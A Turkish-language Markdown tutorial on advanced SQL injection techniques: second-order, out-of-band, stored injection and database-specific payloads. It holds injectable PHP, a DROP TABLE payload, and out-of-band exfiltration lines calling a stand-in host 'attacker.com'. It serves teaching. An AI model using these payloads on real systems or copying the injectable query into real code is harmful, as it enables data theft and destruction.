```md
## 1️⃣ Advanced / İleri SQLi Teknikleri

SQL Injection’da temel yöntemlerin ötesinde kullanılan ileri teknikler ve açıklamaları:

---

### a) Second-Order SQL Injection
- Açık ilk sorguda görülmez, kullanıcı girdisi başka bir sorguda tetiklenir.
- Örnek:
```php
// Kullanıcı kaydı sırasında zararsız görünen input
$username = $_POST['username'];
$query = "INSERT INTO users(username) VALUES ('$username')";
```
- Daha sonra başka sorguda çalıştırıldığında:
```sql
SELECT * FROM users WHERE username = '$username'
```
- Payload: `' OR '1'='1` → ikinci sorguda etkili olur.

---

### b) Out-of-Band (OOB) SQLi
- Normal sorgularda veri görünmez, veri DNS veya HTTP isteği ile sızdırılır.
- Kullanım senaryosu: WAF veya filtreler nedeniyle normal veri çıkarılamıyor.
- Örnek:
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
```
- MySQL:
```sql
SELECT LOAD_FILE('\\\\attacker.com\\file.txt');
```

---

### c) Stored / Persistent SQLi
- Kullanıcı girdisi veritabanına kaydedilir ve sonraki işlemlerde tetiklenir.
- Örnek: Forum veya yorum alanı
```sql
<input name="comment" value="'); DROP TABLE users; --">
```
- Yorum okunduğunda veya listelendiğinde SQLi tetiklenir.

---

### d) Veritabanına Özel Payloadlar
- **MySQL**: `UNION SELECT`, `information_schema.tables`  
- **MSSQL**: `xp_cmdshell`, `master..sysdatabases`  
- **PostgreSQL**: `pg_sleep()`, `version()`  
- **Oracle**: `UTL_HTTP.REQUEST`, `DUAL`  

---

### e) Karmaşık Injection Senaryoları
- Multi-layer SQLi (JOIN + UNION + Subquery)  
- Boolean + Time-Based kombinasyonu  
- Parametre birden fazla yerde kullanılıyorsa **Second-Order** ile birleştirme  

---

### 📌 Özet
- Advanced SQLi, temel payloadlardan daha karmaşık ve hedef odaklıdır.  
- Genellikle **blind, stored ve OOB** yöntemleri içerir.  
- Hedef veritabanının tipi ve güvenlik önlemleri, hangi tekniğin kullanılacağını belirler.
```
